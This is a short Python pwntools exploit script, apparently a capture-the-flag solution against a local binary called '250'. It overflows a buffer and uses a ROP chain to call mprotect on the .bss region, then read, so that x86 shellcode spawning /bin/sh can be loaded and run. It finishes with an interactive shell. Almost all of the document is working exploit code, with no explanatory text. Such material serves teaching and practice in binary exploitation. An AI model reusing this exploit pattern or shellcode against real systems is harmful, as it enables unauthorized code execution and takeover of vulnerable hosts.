#!/usr/bin/python

from pwn import *

shellcode = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73"
shellcode += "\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0"
shellcode += "\x0b\xcd\x80"

bssAddr = 0x080ec000
mprotectAddr = 0x0806e070
readAddr = 0x0806d510
writeAddr = 0x0806d580


p = process('./250')
gdb.attach(p)
context.log_level = 'debug'
p.recvuntil('Size]')
p.sendline('102')
p.recvuntil('Data]')

pppppr = 0x08098774
pppr = 0x080ad715

payload = 'a'*62+p32(mprotectAddr) + p32(pppr) + p32(bssAddr) + p32(0x1000) + p32(7)
payload += p32(readAddr) + p32(bssAddr) + p32(0) + p32(bssAddr) + p32(len(shellcode))
p.send(payload)
raw_input('send shellcode?')
p.send(shellcode)
#p.recv()


p.interactive()
